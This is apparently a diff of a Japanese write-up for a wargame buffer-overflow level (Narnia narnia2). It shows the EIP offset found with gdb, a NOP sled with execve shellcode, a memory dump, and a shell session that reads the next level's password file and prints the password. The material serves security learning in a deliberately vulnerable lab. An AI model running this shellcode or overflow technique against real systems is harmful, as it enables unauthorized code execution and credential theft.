@@ -149,13 +149,34 @@ AmAA found at offset: 140
 ```
 gdbで調べると上のように、140字からEIPを上書きすることがわかる。
 
-bufにシェルコードを入れて、そのあとEIPをシェルコードのあるアドレスに書き換えれば良い。
-
-27byteのシェルコードを使う。
+bufにシェルコード( http://shell-storm.org/shellcode/files/shellcode-575.php )を入れて、そのあとEIPをシェルコードのあるアドレスに書き換えれば良い。
 
 ```
-\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
-`python -c 'print "0x90"*50 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "0x90"*63 + "BBBB"'`
+(gdb) r $(python -c'print "\x90"*119+ "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "BBBB"')
+Starting program: /narnia/narnia2 $(python -c'print "\x90"*119+ "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "BBBB"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/250x $esp
+0xffffd870:	0x6e72616e	0x00326169	0x90909090	0x90909090
+0xffffd880:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd890:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8e0:	0x90909090	0x90909090	0x90909090	0x6a909090
+0xffffd8f0:	0x5299580b	0x732f2f68	0x622f6868	0xe3896e69
+0xffffd900:	0x80cdc931	0x42424242	0x45485300	0x2f3d4c4c
+0xffffd910:	0x2f6e6962	0x68736162	0x52455400	0x74783d4d
 ```
-`python -c 'print "0x90"*50 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "0x90"*63 + "BBBB"'`
-なぜか 0xffffd8b8 になるんだががが
+NOPのあとにシェルコードを仕込んだ。NOPのどこかにEIPを設定すれば自動的にシェルコードまで勝手にずれてくれる.
+
+0xffffd8a0あたりにEIPを設定するとシェルを起動できた。
+```
+narnia2@narnia:~$ /narnia/narnia2 $(python -c'print "\x90"*119+ "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xa0\xd8\xff\xff"')
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+```
+
+
